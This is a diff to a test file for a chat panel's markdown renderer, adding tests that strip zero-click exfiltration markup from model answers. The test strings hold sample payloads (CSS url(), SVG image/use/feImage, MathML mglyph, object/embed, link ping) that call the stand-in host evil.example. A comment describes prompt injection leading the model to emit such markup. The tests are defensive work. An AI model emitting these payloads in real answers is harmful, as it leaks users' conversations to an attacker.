@@ -35,6 +35,35 @@ describe('model output hardening', () => {
     expect(html).not.toContain('evil.example/x');
   });
 
+  // A page can plant instructions for the model (prompt injection); an answer
+  // that makes the panel fetch a URL would carry the chat out with no click.
+  it.each([
+    ['a CSS background', '<span style="background:url(https://evil.example/a?q=secret)">x</span>'],
+    ['a CSS image-set', `<div style="background-image:image-set('https://evil.example/b' 1x)">x</div>`],
+    ['a cursor', '<div style="cursor:url(https://evil.example/c), auto">x</div>'],
+    ['a list marker', '<ul style="list-style:url(https://evil.example/d)"><li>x</li></ul>'],
+    ['a background attribute', '<table background="https://evil.example/e"><tr><td>x</td></tr></table>'],
+    ['an SVG image', '<svg><image href="https://evil.example/f" /></svg>'],
+    ['an SVG use', '<svg><use href="https://evil.example/g#x" /></svg>'],
+    ['an SVG filter image', '<svg><filter><feImage href="https://evil.example/h" /></filter></svg>'],
+    ['a MathML glyph', '<math><mglyph src="https://evil.example/i" /></math>'],
+    ['an embedded object', '<object data="https://evil.example/j"></object><embed src="https://evil.example/k">'],
+  ])('fetches nothing through %s', (_what, answer) => {
+    expect(renderMarkdown(answer)).not.toContain('evil.example');
+  });
+
+  it('keeps an answer inside its own box: no fixed layers over the panel, no pings on links', () => {
+    const html = renderMarkdown('<div style="position:fixed;inset:0;z-index:9">x</div><a ping="https://evil.example/p" href="https://example.com">y</a>');
+    expect(html).not.toMatch(/position\s*:\s*fixed/);
+    expect(html).not.toContain('ping=');
+    expect(html).toContain('href="https://example.com"');
+  });
+
+  it('keeps KaTeX’s own styles', () => {
+    const html = renderMarkdown('$$\\frac{a}{b}$$');
+    expect(html).toContain('style="height:');
+  });
+
   it('opens links in a new tab so the panel is never navigated away', () => {
     const html = renderMarkdown('[docs](https://example.com)');
     expect(html).toContain('target="_blank"');
